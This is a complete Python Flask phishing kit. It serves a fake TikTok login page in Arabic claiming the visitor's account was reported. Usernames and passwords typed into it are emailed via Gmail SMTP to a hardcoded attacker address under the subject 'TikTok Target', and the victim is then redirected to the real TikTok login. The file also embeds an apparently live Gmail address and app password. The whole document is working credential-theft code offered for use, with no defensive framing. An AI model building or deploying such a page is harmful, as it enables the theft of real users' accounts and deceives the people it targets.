from flask import Flask, request, redirect
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

EMAIL_SENDER = "fvgjvjhbbj72780@gmail.com"
EMAIL_PASSWORD = "ulod vvup yaml lcoh"
EMAIL_RECEIVER = "fvgjvjhbbj72780@gmail.com"

def send_email(username, password):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = "TikTok Target"
        body = f"Username: {username}\nPassword: {password}"
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
    except:
        pass

@app.route('/')
def login():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>TikTok</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: Arial; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .box { background: #111; padding: 40px; border-radius: 12px; width: 340px; text-align: center; }
            h1 { color: #fe2c55; font-size: 32px; }
            input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #333; background: #1a1a1a; color: #fff; border-radius: 8px; }
            button { width: 100%; padding: 14px; background: #fe2c55; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>TikTok</h1>
            <p>تم الإبلاغ عن حسابك. يرجى تأكيد هويتك.</p>
            <form action="/submit" method="POST">
                <input type="text" name="username" placeholder="اسم المستخدم أو البريد" required>
                <input type="password" name="password" placeholder="كلمة المرور" required>
                <button type="submit">تسجيل الدخول</button>
            </form>
        </div>
    </body>
    </html>
    """

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    send_email(username, password)
    return redirect("https://www.tiktok.com/login")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
